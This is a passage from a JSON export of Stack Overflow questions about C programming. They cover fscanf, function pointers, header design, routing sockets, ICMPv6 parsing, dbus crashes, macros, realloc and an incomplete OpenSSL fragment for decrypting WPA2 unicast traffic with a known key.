?</p>\n"},{"tags":["c"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13250441,"title":"C fscanf read character or integer","body":"<p>I need to read characters and integers from a text file using fscanf, but I don't know whether the next value is going to be a character or an integer. How do I do something like</p>\n\n<pre><code>if(next_is_character)\n    fscanf(file, \"%c\", &amp;mycharacter);\nelse\n    fscanf(file, \"%d\", &amp;myinteger);\n</code></pre>\n"},{"tags":["c","pointers","function-pointers"],"answer_count":4,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":82,"score":2,"question_id":13250777,"title":"what's the difference between int (* f [])(); and int f[]();","body":"<p>i find this in <em>Pointers on C</em></p>\n\n<pre><code>int f[]();  /* this one is illegal */\n</code></pre>\n\n<p>and:</p>\n\n<pre><code>int (* f [])(); /* this one legal. */\n</code></pre>\n\n<p>i really want know what's the usage of the second one.</p>\n\n<p>thank you.</p>\n"},{"tags":["c","arrays","char"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":13250278,"title":"C change the indices representation of an array","body":"<p>I want to use char to represent an array<br>\nsay I have a </p>\n\n<pre><code>char arrays[50]={\"hello\", \"world\"};\n</code></pre>\n\n<p>instead of the zero index representing the first string I want a letter to represent it,\nI know that this can be done in java with a hash table\nis this possible in c </p>\n\n<p>I am thinking of using an array of pointers to refer to each string\nbut I have no idea how to implement it in a large array as I have just started learning the use of pointers<br>\nsomething like</p>\n\n<pre><code>char *a:\narrays[0]=&amp;a;\n</code></pre>\n"},{"tags":["c","static-libraries","static-linking","library-design"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":13250001,"title":"How to design the interface for a static library in C","body":"<p>Although I am not an experienced programmer in C, I have to use this language at work to build a static library which compiles both on SunOS and Win32. This library has just a few source files and their correspondent headers (let's say: <code>a.c</code>, <code>b.c</code>, <code>a.h</code> and <code>b.h</code>). The project compiles in both platforms and the library <code>mylib.a</code> is generated.</p>\n\n<p>My problem is how to expose the implemented functions of <code>mylib.a</code> to other projects, because when I add both <code>a.h</code> and <code>b.h</code> I get some macro redefinition errors.</p>\n\n<p>EDIT: I found that the macro redefinition error was because of a macro definition into the compilation command (not related to my headers) and it is solved :) But still I would like advice on organizing my source and header files.</p>\n\n<p>My doubt is whether I modify <code>a.h</code> and <code>b.h</code> to be used externally or if I should create a header file specifically for declaring the interface of this library (let's say <code>mylib.h</code>). I would not like to overcomplicate the original headers, but I would not like to have to keep a different header in sync ... I would like to hear from more experienced C programmers about their patterns, advantages of each approach and whether there are other options.</p>\n\n<p>Thank you in advance.</p>\n\n<p>EDIT: seems I have not provided enough information; the schema below tries to show how my files are organised: each code file only includes its header, each header has a guard condition, each header includes a common header, this common header includes all headers.</p>\n\n<pre><code>// a.c ----\n#include \"a.h\"\n\n// b.c ----\n#include \"b.h\"\n\n// a.h ----\n#ifndef GUARD_A_H\n#define GUARD_A_H\n  # include \"liball.h\"\n  void function_prototypes_implemented_in_a();\n#endif // GUARD_A_H\n\n// b.h ----\n#ifndef GUARD_B_H\n#define GUARD_B_H\n  # include \"liball.h\"\n  void function_prototypes_implemented_in_b();\n#endif // GUARD_B_H\n\n// liball.h ----\n#ifndef GUARD_LIBALL_H\n#define GUARD_LIBALL_H\n  # include &lt;time.h&gt;   // standard headers\n  # include &lt;stdioa.h&gt;\n\n  # include \"a.h\"      // all headers in this project\n  # include \"b.h\"\n#endif // GUARD_LIBALL_H\n</code></pre>\n"},{"tags":["c","casting"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":996,"score":-3,"question_id":2434225,"title":"Identify the implicit cast and explicit cast","body":"<p>I would appreciate it if anyone can answer my question.<br>\nIdentify the implicit cast and explicit cast?</p>\n\n<pre><code>int a = 2, b = 3;\n\nfloat f = 2.5;\ndouble d = -1.2;\nint int_result;\nfloat real_result;\n</code></pre>\n"},{"tags":["c++","c","timer"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":41,"score":-2,"question_id":13251241,"title":"Writing timer at server side for client requests in C/C++","body":"<p>In my client - server architecture I want to implement a timer which should handle client's requests timeout. Lets say multiple clients are sending requests to server. Server has queue for say multiple threads to process. Now if it takes more time, one need to send the client time-out response. There could be multiple ways. What I am looking is : max 1 separate thread which should have a timer queue and that stores the client's context so that it can call a callback function and that function should send time-out response.\nWhat is the best way to design a generic timer in C/C++. The solution should work in all the platform using standard C/C++. </p>\n"},{"tags":["c","unix","routing","network-programming"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":442,"score":0,"question_id":5380205,"title":"using newlib with gcc for routing sockets (unix network programming)","body":"<p>I study from a book called Unix network programming 3rd edition\nand I wrote the following code and i found it needs a library called if_dl.h\nwhich i didn't has cuz i work on ubuntu so i installed the lib-newlib and used it..</p>\n\n<p>but on compile time i get alot of errors that refer to the header files that the newlib has like\n/usr/lib/newlib/i486-linux-gnu/include/net/route.h:54: error: field ro_dst has incomplete type\nand same for rt_dst and rt_gateway\nbut there is another problem...\nthat the code uses sa_len which is assumed to be a member in the sockaddr structure..\nbut the sockaddr only has the sa_family,sa_data members..\nso is the problem that i need to work on freeBSD or what?</p>\n\n<p>the code I am talkin about</p>\n\n<pre><code>   #include &lt;stdio.h&gt;\n   #include &lt;stdlib.h&gt;\n   #include &lt;net/route.h&gt;\n   #include &lt;net/if.h&gt;\n   #include &lt;net/if_dl.h&gt;\n   #include &lt;netinet/in.h&gt;\n   #include &lt;sys/socket.h&gt;\n   #include &lt;unistd.h&gt;\n\n 2 #define BUFLEN   (sizeof(struct rt_msghdr) + 512)\n 3                      /* sizeof(struct sockaddr_in6) * 8 = 192 */\n 4 #define SEQ      9999\n\n 5 int\n 6 main(int argc, char **argv)\n 7 {\n 8     int     sockfd;\n 9     char   *buf;\n10     pid_t   pid;\n11     ssize_t n;\n12     struct rt_msghdr *rtm;\n13     struct sockaddr *sa, *rti_info[RTAX_MAX];\n14     struct sockaddr_in *sin;\n\n15     if (argc != 2)\n16         err_quit(\"usage: getrt &lt;IPaddress&gt;\");\n\n17     sockfd = Socket(AF_ROUTE, SOCK_RAW, 0); /* need superuser privileges */\n\n18     buf = Calloc(1, BUFLEN);     /* and initialized to 0 */\n\n19     rtm = (struct rt_msghdr *) buf;\n20     rtm-&gt;rtm_msglen = sizeof(struct rt_msghdr) + sizeof(struct sockaddr_in);\n21     rtm-&gt;rtm_version = RTM_VERSION;\n22     rtm-&gt;rtm_type = RTM_GET;\n23     rtm-&gt;rtm_addrs = RTA_DST;\n24     rtm-&gt;rtm_pid = pid = getpid();\n25     rtm-&gt;rtm_seq = SEQ;\n\n26     sin = (struct sockaddr_in *) (rtm + 1);\n27     sin-&gt;sin_len = sizeof(struct sockaddr_in);\n28     sin-&gt;sin_family = AF_INET;\n29     Inet_pton(AF_INET, argv[1], &amp;sin-&gt;sin_addr);\n\n30     Write(sockfd, rtm, rtm-&gt;rtm_msglen);\n\n31     do {\n32         n = Read(sockfd, rtm, BUFLEN);\n33     } while (rtm-&gt;rtm_type != RTM_GET || rtm-&gt;rtm_seq != SEQ ||\n34              rtm-&gt;rtm_pid != pid);\n35     rtm = (struct rt_msghdr *) buf;\n36     sa = (struct sockaddr *) (rtm + 1);\n37     get_rtaddrs(rtm-&gt;rtm_addrs, sa, rti_info);\n38     if ( (sa = rti_info[RTAX_DST]) != NULL)\n39         printf(\"dest: %s\\n\", Sock_ntop_host(sa, sa-&gt;sa_len));\n\n40     if ( (sa = rti_info[RTAX_GATEWAY]) != NULL)\n41         printf(\"gateway: %s\\n\", Sock_ntop_host(sa, sa-&gt;sa_len));\n\n42     if ( (sa = rti_info[RTAX_NETMASK]) != NULL)\n43         printf(\"netmask: %s\\n\", Sock_masktop(sa, sa-&gt;sa_len));\n\n44     if ( (sa = rti_info[RTAX_GENMASK]) != NULL)\n45         printf(\"genmask: %s\\n\", Sock_masktop(sa, sa-&gt;sa_len));\n\n46     exit(0);\n47 }\n</code></pre>\n\n<hr>\n\n<pre><code>2 /*\n 3  * Round up 'a' to next multiple of 'size', which must be a power of 2\n 4  */\n 5 #define ROUNDUP(a, size) (((a) &amp; ((size)-1)) ? (1 + ((a) | ((size)-1))) : (a))\n 6 /*\n 7  * Step to next socket address structure;\n 8  * if sa_len is 0, assume it is sizeof(u_long).\n 9  */\n10 #define NEXT_SA(ap) ap = (SA *) \\\n11     ((caddr_t) ap + (ap-&gt;sa_len ? ROUNDUP(ap-&gt;sa_len, sizeof (u_long)) : \\\n12                                        sizeof(u_long)))\n13 void\n14 get_rtaddrs(int addrs, SA *sa, SA **rti_info)\n15 {\n16     int     i;\n17     for (i = 0; i &lt; RTAX_MAX; i++) {\n18         if (addrs &amp; (1 &lt;&lt; i)) {\n19             rti_info[i] = sa;\n20             NEXT_SA(sa);\n21         } else\n22             rti_info[i] = NULL;\n23     }\n24 }\n</code></pre>\n\n<hr>\n\n<pre><code> 2 const char *\n 3 sock_masktop(SA *sa, socklen_t salen)\n 4 {\n 5     static char str[INET6_ADDRSTRLEN];\n 6     unsigned char *ptr = &amp;sa-&gt;sa_data[2];\n 7     if (sa-&gt;sa_len == 0)\n 8         return (\"0.0.0.0\");\n 9     else if (sa-&gt;sa_len == 5)\n10         snprintf(str, sizeof(str), \"%d.0.0.0\", *ptr);\n11     else if (sa-&gt;sa_len == 6)\n12         snprintf(str, sizeof(str), \"%d.%d.0.0\", *ptr, *(ptr + 1));\n13     else if (sa-&gt;sa_len == 7)\n14         snprintf(str, sizeof(str), \"%d.%d.%d.0\", *ptr, *(ptr + 1),\n15                  *(ptr + 2));\n16     else if (sa-&gt;sa_len == 8)\n17         snprintf(str, sizeof(str), \"%d.%d.%d.%d\",\n18                  *ptr, *(ptr + 1), *(ptr + 2), *(ptr + 3));\n19     else\n20         snprintf(str, sizeof(str), \"(unknown mask, len = %d, family = %d)\",\n21                  sa-&gt;sa_len, sa-&gt;sa_family);\n22     return (str);\n23 }\n</code></pre>\n"},{"tags":["c++","c","unix","polling"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":61,"score":2,"question_id":13248495,"title":"Elegant way to add/remove descriptors to/from poll","body":"<p>I have to handle around 1000 descriptors in one <code>poll</code> (I can't use <code>epoll</code> as it's Linux specific) and I have to be able to dynamically add/remove them(handle new connections and remove closed).</p>\n\n<p>This means I should recombine the descriptors array on each iteration. </p>\n\n<p>This is rather obvious from a technical point of view, but does anybody know a beautiful way to do that? </p>\n"},{"tags":["c","compiler-errors","structure"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":44,"score":2,"question_id":13247853,"title":"HiC : Structure within Structure?","body":"<p>this is my first time using structure within a structure. \nI encounter this error when I compile my program.\nerror: field 'results' has incomplete type.</p>\n\n<p>The error is referring to this line of code.\n-->struct result_t results;</p>\n\n<p>Any help please? :)\nThanks.</p>\n\n<pre><code>typedef struct {\nchar moduleCode[8];\nchar grade[3];\n} result_t;\n\ntypedef struct {\nchar name[31];\nstruct result_t results;\n} student_t;\n</code></pre>\n\n<p>Edit:</p>\n\n<p>I changed my codes: </p>\n\n<pre><code>typedef struct {\nchar moduleCode[8];\nchar grade[3];\n} result_t;\n\ntypedef struct {\nchar name[31];\nresult_t results;\n} student_t;\n</code></pre>\n\n<p>and I got a new compilation error. \nerror : subscripted value is neither array nor pointer. </p>\n\n<p>The line of code that triggered that error is as follows. \nprintf(\" %-7s %-2s %d\\n\", student.results[i].module_code, student.results[i].grade, student.results[i].mc);</p>\n"},{"tags":["c++","c","unix","ipv6","icmp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13250115,"title":"get ICMPv6 header from IPv6 packet","body":"<p>Hi i'm stuck on getting ICMPv6 header from IPv6 packet.</p>\n\n<pre><code>        size = sizeof(sockaddr_in6);\n        if ((lenght = recvfrom(socd, buffer, BUFSIZE, 0, (sockaddr *)&amp;receiveSockAddr, &amp;size)) &lt; 0) {\n          cerr &lt;&lt; \"recvfrom error\" &lt;&lt; endl;\n        }\n\n        ip = (ip6_hdr *) buffer;\n\n        cout &lt;&lt; \"Payload length: \" &lt;&lt; ip-&gt;ip6_ctlun.ip6_un1.ip6_un1_plen &lt;&lt; endl;\n        cout &lt;&lt; \"Payload length ntohs: \" &lt;&lt; ntohs(ip-&gt;ip6_ctlun.ip6_un1.ip6_un1_plen) &lt;&lt; endl;\n\n        //icmpRec = (icmp6_hdr *) (buffer + ???offset???);\n</code></pre>\n\n<p>I need find out how to set the offset. Only way I know is to get payload length and then the: <strong>packet length - payload length = my offset</strong>. But in <strong>ip->ip6_ctlun.ip6_un1.ip6_un1_plen</strong> are some weird numbers.</p>\n\n<p>From the code above im receiving:</p>\n\n<pre><code>Payload length: 25332\nPayload length ntohs: 62562 \n</code></pre>\n\n<p>after sending ICMP6_ECHO_REQUEST to ipv6.google.com</p>\n\n<p>But if I look in wireshark the Payload length is 8 bytes. How to correctly decode the payload number from <strong>uint16_t</strong> to correct decimal number <strong>8</strong>? And how get the whole size of IPv6 packet to calculate the offset? Why IPv6 haven't IHL as IPv4? This very complicate the work aroud IPv6 I think.</p>\n"},{"tags":["c++","c","winapi","visual-c++"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":44,"score":0,"question_id":13249606,"title":"How to compare strstr(LPCWSTR, CHAR*);","body":"<pre><code>LPCWSTR location_url;\nm_spWebBrowser-&gt;get_LocationURL((BSTR*)&amp;location_url);\n</code></pre>\n\n<p>How do I compare <code>LPCWSTR</code>  with <code>const char *</code> in <code>strstr</code> ?</p>\n\n<p>Example: </p>\n\n<pre><code>if(strstr((location_url, \".html\"))\n</code></pre>\n"},{"tags":["c++","c","sparse-matrix","sparse"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":32,"score":-5,"question_id":13250627,"title":"Insert Sparse matrix nonzero element in hash table","body":"<p>I need to insert <strong>sparse matrix</strong> nonzero element to hash table with hash function implementation in c++ :</p>\n\n<ol>\n<li><code>insert_to_Hash(matrix_element)</code>  and retrieve matrix <strong>value by 2</strong>. <code>retrieve_from_Hash(row,column).</code></li>\n</ol>\n"},{"tags":["c","linux","dbus"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13248283,"title":"dbus SIGABRT / SIGSEGV issues \"sometimes\"","body":"<p>While using the DBUS library in a C code. I do get some issues while trying to send back the response on bus causing one of the processes to crash.</p>\n\n<p>I can't paste some parts of code due to confidentiality and because I don't really know where it is coming from (not even a slight idea).</p>\n\n<p>The scenario is : </p>\n\n<ul>\n<li><p>I send thousands of message on DBUS via little C program (that work for sure).</p></li>\n<li><p>And sometimes DBUS can't answer the reply by throwing a SIGABRT signal.</p></li>\n<li><p>Also, the program is multi-threaded, and use globals in a lot of places and particularly to store the DBusConnection. </p></li>\n<li><p>Mutex locks / unlocks are supposed to be set correctly, but if you can argue that that kind of error can be due to threading issues go ahead.   </p></li>\n<li><p>I did check the data generated for the response and it doesn't look any different than when sending the reply successfully.</p></li>\n</ul>\n\n<p>Here is the back trace.</p>\n\n<pre><code>(gdb) bt\n#0  0x00000033f6032885 in raise () from /lib64/libc.so.6\n#1  0x00000033f6034065 in abort () from /lib64/libc.so.6\n#2  0x000000361c22a975 in _dbus_abort () at dbus-sysdeps.c:88\n#3  0x000000361c226845 in _dbus_warn_check_failed (format=0x361c2339e0 \"arguments to %s() were incorrect, assertion \\\"%s\\\" failed in file %s line %d.\\nThis is normally a bug in some application using the D-Bus library.\\n\") at dbus-internals.c:283\n#4  0x000000361c20ec65 in _dbus_connection_send_preallocated_unlocked_no_update (connection=0xae5850, preallocated=0x0, \nmessage=0xae5d20, client_serial=0x7f09ffffe8a8) at dbus-connection.c:1973\n#5  0x000000361c20f449 in _dbus_connection_send_preallocated_and_unlock (connection=0xae5850, \npreallocated=&lt;value optimized out&gt;, message=&lt;value optimized out&gt;, client_serial=&lt;value optimized out&gt;)\nat dbus-connection.c:2010\n#6  0x000000361c20f667 in _dbus_connection_send_and_unlock (connection=0xae5850, message=0xae5d20, \nclient_serial=0x7f09ffffe8a8) at dbus-connection.c:2047\n</code></pre>\n\n<p>Also, it isn't the only issue I'm facing.\nI do get (sometimes) a segmentation fault when trying to call dbus_connection_read_write.</p>\n\n<pre><code>(gdb) bt\n#0  _dbus_list_unlink (list=0x1ef1880, link=0x0) at dbus-list.c:509\n#1  0x000000361c20ed3c in _dbus_connection_message_sent (connection=0x1ef1850, message=0x1ef1d20) at dbus-connection.c:602\n#2  0x000000361c224291 in do_writing (transport=0x1ef1190) at dbus-transport-socket.c:650\n#3  0x000000361c224548 in socket_do_iteration (transport=0x1ef1190, flags=&lt;value optimized out&gt;, \ntimeout_milliseconds=&lt;value optimized out&gt;) at dbus-transport-socket.c:1105\n#4  0x000000361c22275d in _dbus_transport_do_iteration (transport=0x1ef1190, flags=&lt;value optimized out&gt;, \ntimeout_milliseconds=&lt;value optimized out&gt;) at dbus-transport.c:956\n#5  0x000000361c20ebae in _dbus_connection_do_iteration_unlocked (connection=0x1ef1850, flags=7, timeout_milliseconds=0)\nat dbus-connection.c:1163\n#6  0x000000361c210ce0 in _dbus_connection_read_write_dispatch (connection=0x1ef1850, timeout_milliseconds=0, \ndispatch=&lt;value optimized out&gt;) at dbus-connection.c:3491\n</code></pre>\n\n<p>this backtrace looks clearer as it tries to deference a NULL pointer (link variable).</p>\n\n<p>But still don't understand why the hell it is NULL. </p>\n\n<p>I call dbus_bus_get() before each dbus calls (mostly for safety since I don't really know where to look for.) and DbusError isn't set.</p>\n\n<p>I know there isn't a lot of details, but I if you can, with the back trace, point out some possible leads to follow, I would love you!</p>\n\n<p>Desperate man speaking.</p>\n"},{"tags":["c"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":55,"score":-6,"question_id":13250450,"title":"travelling salesman","body":"<p><code>n</code> cities are located at n different points numbered <code>1 to n</code> </p>\n\n<p>with coordinates <code>(x1,y1).........(xn,yn)</code>.</p>\n\n<p>A person has to travel from 1st city to nth city i.e. <code>from (x1,y1) to (xn,yn)</code> and return back to 1st city.</p>\n\n<p>He needs 1 unit of food for each unit distance he travels.maximum amount of food he can carry is k units.</p>\n\n<p>Unlimited amount of food is present at 1st city.he can use the intermediate cities to store his food.what is the minimum amount of food used for his travel. assume distance between cities as integers.</p>\n\n<p>Is there any classical version of this problem?</p>\n"},{"tags":["c","email","ubuntu","thunderbird","dwm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13129830,"title":"Read out Thunderbird unread mail? (linux, terminal)","body":"<p>I am about building a statusbar for dwm,\ni want to read out the unread-mail-count via terminal (with grep, sed, or fopen as a file)\nand get it via fopen/popen.</p>\n\n<p>I am using ubuntu/dwm/thunderbird 16.\nI Think there is no text-file containing the unread-email count...</p>\n\n<p>Any suggestions?</p>\n"},{"tags":["c++","c"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":101,"score":1,"question_id":13250163,"title":"C++ Replacing Functions with Macros","body":"<p>We have an existing function implementation in our C++ code:</p>\n\n<pre><code>void Function(int param)\n{\n    printf(\"In Function\\n\");\n}\n\nint main()\n{\n    Function(10);\n    return 0;\n}\n</code></pre>\n\n<p>I wish to change it to call another function (by help of a macro declaration) which would accept additional params like  <strong>FILE</strong> and <strong>LINE</strong> (for debugging purpose) and then call the actual function:</p>\n\n<pre><code>#define Function(param) Function_debug(param, __FILE__,  __FUNCTION__,  __LINE__) \\\n{\\\n    printf(\"In Function_debug [%s] [%s] [%d]\\n\", file, func, line); \\\n    Function(param);\\\n}\n</code></pre>\n\n<p>But the below code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#define Function(param) Function_debug(param, __FILE__,  __FUNCTION__,  __LINE__) \\\n{\\\n    printf(\"In Function_debug [%s] [%s] [%d]\\n\", file, func, line); \\\n    Function(param);\\\n}\n\nvoid Function(int param)\n{\n    printf(\"In Function\\n\");\n}\n\nint main()\n{\n    Function(10);\n    return 0;\n}\n</code></pre>\n\n<p>Translates TO:</p>\n\n<pre><code>void Function_debug(int param, \"temp.cpp\", __FUNCTION__, 9) { printf(\"In Function_debug [%s] [%s] [%d]\\n\", file, func, line); Function(int param);}\n{\n    printf(\"In Function\\n\");\n}\n\nint main()\n{\n    Function_debug(10, \"temp.cpp\", __FUNCTION__, 16) { printf(\"In Function_debug [%s] [%s] [%d]\\n\", file, func, line); Function(10);};\n    return 0;\n}\n</code></pre>\n\n<p>which gives compilation errors.</p>\n\n<p>Please direct me how to achieve the objective?</p>\n"},{"tags":["c","memory-management","malloc","realloc","libc"],"answer_count":3,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":99,"score":6,"question_id":13247526,"title":"realloc but only first few bytes is meaningful","body":"<p>Assume I have used <code>ptr = malloc(old_size);</code> to allocate a memory block with <code>old_size</code> bytes. Only the first <code>header_size</code> bytes is meaningful. I'm going to increase the size to <code>new_size</code>.</p>\n\n<p><code>new_size</code> is greater than <code>old_size</code> and <code>old_size</code> is greater than <code>header_size</code>.</p>\n\n<p>before:</p>\n\n<pre><code>/- - - - - - - old_size - - - - - - - \\\n+===============+---------------------+\n \\-header_size-/\n</code></pre>\n\n<p>after:</p>\n\n<pre><code>/- - - - - - - - - - - - - - - new_size - - - - - - - - - - - - - - - - - - -\\\n+===============+------------------------------------------------------------+\n\\- header_size-/\n</code></pre>\n\n<p>I don't care what is stored after <code>ptr + header_size</code> because I'll read some data to there.</p>\n\n<h3>method 1: go straight to <code>new_size</code></h3>\n\n<pre><code>ptr = realloc(ptr, new_size);\n</code></pre>\n\n<h3>method 2: shrink to <code>header_size</code> and grow to <code>new_size</code></h3>\n\n<pre><code>ptr = realloc(ptr, header_size);\nptr = realloc(ptr, new_size);\n</code></pre>\n\n<h3>method 3: allocate a new memory block and copy the first <code>header_size</code> bytes</h3>\n\n<pre><code>void *newptr = malloc(new_size);\nmemcpy(newptr, ptr, header_size);\nfree(ptr);\nptr = newptr;\n</code></pre>\n\n<p>Which is faster?</p>\n"},{"tags":["c"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":13236191,"title":"Reading in a file to create multiple \"minesweeper\"ish arrays","body":"<p>What I got so far, is a .in file that will create 100 arrays, followed by how many \"mines\" are on the board, and then 2 numbers for each \"mine\" representing where they will be placed on the array. This is for my beginner C class, and honestly we've not been taught properly for something this advanced (i say advanced using the term lightly). I know how to read in files, and I know how to create an array, but im unsure how I would read in that many lines, switching from mines to placement over and over again. I also find myself confused as to how to change an array number from 0 to another number based on where a mine is placed.</p>\n\n<p>An example input file:</p>\n\n<pre><code>1\n4\n1 3\n7 5\n7 3\n3 3\n</code></pre>\n\n<p>Where the <code>1</code> in the first line means we have one board. The <code>4</code> on the next line means it will have 4 bombs. The following 4 lines describe the position of the bomb in the array as <code>row column</code>.</p>\n\n<p>Is there anything that anyone can offer me to point me in the right direction?</p>\n"},{"tags":["c","pointers","volatile"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":56,"score":6,"question_id":13249791,"title":"What's meaning of these volatile with pointers in C ?","body":"<pre><code>volatile void * ptr;\n</code></pre>\n\n<p>Whether <code>ptr</code> is <code>volatile</code> or it points to the <code>volatile location</code>.</p>\n\n<p>So the actual doubt is :\nIs the same thing applied to the above declaration as it applied with <code>const</code> qualifier ?  </p>\n\n<p>Little explanation will help me a lot.</p>\n"},{"tags":["c++","c"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":13249796,"title":"comparing float variable","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/17333/most-effective-way-for-float-and-double-comparison\">Most effective way for float and double comparison</a><br>\n  <a href=\"http://stackoverflow.com/questions/10334688/how-dangerous-is-it-to-compare-floating-point-values\">How dangerous is it to compare floating point values?</a>  </p>\n</blockquote>\n\n\n\n<p>I have <code>const float M = 0.000001;</code> and <code>float input;</code>. I want to not equality check on them. But I know direct check has side effect <code>M != input</code>.  So, my question how I can compare two float value without side effect ?</p>\n"},{"tags":["c"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13249847,"title":"how to run a command on different terminal using fork() and execlp()","body":"<p>I had written a program using NCURSES in which i am displaying a menu on one terminal and want to use fork() and execlp() in the same program but whatever command i am running using fork() and execlp() had to be executed on a different terminal or in the back ground.How that can be done.I am simply using </p>\n\n<pre><code>if(fork())\nwait(0);\nelse\nexeclp(\"ls\",\"ls\",(char *)NULL);\n</code></pre>\n\n<p>within a conditional statement which is displaying a message on the main terminal and will be executing the command inside execlp in the background</p>\n"},{"tags":["c","multithreading","algorithm","maze-solving"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":1,"view_count":128,"score":2,"question_id":13217938,"title":"Maze solving with constraints","body":"<p>I know solving mazes is a frequently discussed topic here on Stack Overflow. Here is a problem that might interest you all.</p>\n\n<p>A maze in the form of a n*n matrix will be given as input. Each element would lie between 0-9. A sequence of numbers, each between 0-9 again would also be given. The dimension of the matrix and the sequence array is also known. The question is to find all possible paths in the matrix from (0,0) to (n-1,n-1) that satisfies the given sequence. The path can move down,right or down+right only. Has to be done using threads.</p>\n\n<p>The input and output format are illustrated in the examples given below-</p>\n\n<p>Examples:\n    <img src=\"http://gowthams.in/etc/1.PNG\" alt=\"Example1\">\n    <img src=\"http://gowthams.in/etc/2.PNG\" alt=\"Example2\">\n    <img src=\"http://gowthams.in/etc/3.PNG\" alt=\"Example3\"></p>\n\n<p>Each thread can either print its position (i,j) or update in some sort of data structure to be processed later.</p>\n\n<p>What is the best way to approach this problem?</p>\n\n<p>This is a homework problem and I am allowed to ask for help. I am not looking for code of any sort. I just want a few pointers in the right direction.</p>\n\n<p>Thanks!</p>\n"},{"tags":["c","binary","bcd"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":64,"score":-1,"question_id":13247647,"title":"Convert integer from (pure) binary to BCD","body":"<p>I'm to stupid right now to solve this problem...</p>\n\n<p>I get a BCD number (every digit is an own 4Bit representation)</p>\n\n<p>For example, what I want:</p>\n\n<ul>\n<li>Input: 202 (hex) == 514 (dec)</li>\n<li><p>Output: BCD 0x415</p></li>\n<li><p>Input: 0x202</p></li>\n<li>Bit-representation: 0010 0000 0010 = 514</li>\n</ul>\n\n<p>What have I tried: </p>\n\n<pre><code>unsigned int uiValue = 0x202;\nunsigned int uiResult = 0;\nunsigned int uiMultiplier = 1;\nunsigned int uiDigit = 0;\n\n\n// get the dec bcd value\nwhile ( uiValue &gt; 0 )\n{\n    uiDigit= uiValue &amp; 0x0F;\n    uiValue &gt;&gt;= 4;\n    uiResult += uiMultiplier * uiDigit;\n    uiMultiplier *= 10;\n}\n</code></pre>\n\n<p>But I know that's very wrong this would be 202 in Bit representation and then split into 5 nibbles and then represented as decimal number again</p>\n\n<p>I can solve the problem on paper but I just cant get it in a simple C-Code </p>\n"},{"tags":["c","ubuntu","undefined-reference","capability"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":412,"score":1,"question_id":8338379,"title":"ubuntu and libcap (capabilities) undefined reference","body":"<p>I'm trying to compile the following minimal C code on ubuntu 10.10:</p>\n\n<pre><code>#include &lt;sys/capability.h&gt;\n\nvoid main(void)\n{\n        cap_t cap;\n        cap = cap_get_proc();\n}\n</code></pre>\n\n<p>with <code>gcc -lcap test.c</code> which gives me the following error:</p>\n\n<pre><code>/tmp/ccCQFyXS.o: In function `main':\ntest.c:(.text+0x9): undefined reference to `cap_get_proc'\ncollect2: ld a retourné 1 code d'état d'exécution\n</code></pre>\n\n<p>I have libcap2-dev and libcap2-bin installed, version 2.21</p>\n\n<pre><code>ls /lib/libcap.*\n/lib/libcap.a  /lib/libcap.so  /lib/libcap.so.2  /lib/libcap.so.2.21\n</code></pre>\n\n<p>The same code with same gcc command build successfully on arch and gentoo</p>\n\n<p>What should I do to get it build on ubuntu too?</p>\n"},{"tags":["c","encryption","openssl","aes","wpa"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":298,"score":2,"question_id":7117777,"title":"How to decrypt wpa 2 psk with openssl, programming in c","body":"<p>I need to decrypt wpa 2 psk programming in c. Assuming that i alredy have the TK (need to decrypt only unicast) I'm trying to decrypt packets whit the following code (with no luck actually):</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;openssl/pem.h&gt;\n#include &lt;openssl/bn.h&gt;\n#include &lt;openssl/aes.h&gt;\n\n\n    struct ctr_state { \nunsigned char ivec[128];   \nunsigned int num; \nunsigned char ecount[128]; \n}; \n\n void init_ctr(struct ctr_state *state, const unsigned char iv[16]){     //\n    state-&gt;num = 0; \n    memset(state-&gt;ecount, 0, 128);\n    memset(state-&gt;ivec, 0, 128); \n    memcpy(state-&gt;ivec, iv, 16);\n} \n\nchar * extochar(char * in, int inLen){\n    int i,k;\n    int resInt[inLen/2];\n    char * resChar=malloc(inLen/2);\n\n    k=0;\n    for(i=0; i&lt;inLen/2; i=i++){\n            resInt[k]=chartoint(in[i*2])&lt;&lt;4;\n            resInt[k]+=chartoint(in[(i*2)+1]);\n            k++;\n    }\n\n    for(k=0; 